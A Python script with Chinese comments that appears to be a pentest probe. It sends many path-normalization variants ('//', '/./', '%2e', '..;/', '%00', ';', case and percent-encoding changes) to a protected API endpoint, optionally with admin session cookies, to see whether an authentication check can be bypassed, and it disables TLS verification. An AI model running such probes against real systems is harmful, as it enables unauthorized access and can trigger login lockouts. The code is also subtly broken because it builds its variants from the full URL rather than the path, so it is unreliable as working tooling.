#!/usr/bin/env python3
"""认证中间件路径归一化绕过探针（通用 · 只读 · 零副作用）

用途：批量测试受保护端点的路径变体是否绕过认证中间件。
仅用于首次判定；**不要反复锤**（若限流按路径分桶，重复探测可能造成平台级登录 DoS）。

用法：
  python3 path_normalization_matrix.py https://target.example/api/v1/me
  python3 path_normalization_matrix.py https://t/api/v1/me -H "Cookie: admin_session=xxx" -H "X-CSRF-Token: yyy"
  python3 path_normalization_matrix.py https://t/api/v1/me -X POST -d '{}'

输出：每个变体的状态码 + 响应体前 110 字符；与基线状态**不同**的标 [!] 供人工判定。
判定提示：401/403 = 仍被拦（正常）；404 = 路由没匹配上（不是绕过）；
          200/204/500 = 真差异，逐个人工核实；SPA fallback 会把 404 变成 HTML 首页，别当接口。
"""
import argparse
import ssl
import sys
import time
import urllib.error
import urllib.request

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def build_variants(path):
    path = path if path.startswith("/") else "/" + path
    segs = path.strip("/").split("/")
    last = segs[-1]
    base = "/" + "/".join(segs[:-1]) if len(segs) > 1 else ""
    out = [
        path,
        path + "/",
        base + "//" + last,
        base + "/./" + last,
        base + "/%2e/" + last,
        path + "%20",
        path + "%09",
        path + "%00",
        path + ";",
        base + "/..;/" + last,
        path + "/..;/",
        path.upper(),
        path + "%2f",
        path + "?",
        path + "#",
        path + "%3f",
        "/./" + path.lstrip("/"),
        base + "//" + last + "/",
    ]
    # 逐字符 percent-encode 最后一段（用于判定限流是否按归一化路径分桶）
    for i in range(len(last)):
        out.append(base + "/" + last[:i] + "%%%02x" % ord(last[i]) + last[i + 1:])
    return list(dict.fromkeys(out))


def probe(url, method, headers, data, timeout):
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in headers.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, r.read(400).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(400).decode("utf-8", "replace")
    except Exception as e:
        return -1, "%s: %s" % (type(e).__name__, e)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("-X", "--method", default="GET")
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("-d", "--data", default=None)
    ap.add_argument("--delay", type=float, default=0.4, help="每次请求间隔（默认 0.4s，别调太小）")
    ap.add_argument("--timeout", type=float, default=15.0)
    a = ap.parse_args()

    headers = {}
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    data = a.data.encode() if a.data else None

    variants = build_variants(a.url)
    print("[*] 基线: %s %s" % (a.method, a.url))
    base_status, base_body = probe(a.url, a.method, headers, data, a.timeout)
    print("    -> %s | %s" % (base_status, base_body[:120].replace("\n", " ")))
    print("[*] 变体数: %d\n" % (len(variants) - 1))

    for v in variants[1:]:
        status, body = probe(v, a.method, headers, data, a.timeout)
        flag = "   " if status == base_status else "[!]"
        print("%s %-4s %-58s %s" % (flag, status, v, body[:110].replace("\n", " ")))
        sys.stdout.flush()
        time.sleep(a.delay)
    print("\n[*] 只判定一次即停手；若命中按路径分桶的惩罚锁，继续探测 = 平台级 DoS。")


if __name__ == "__main__":
    main()
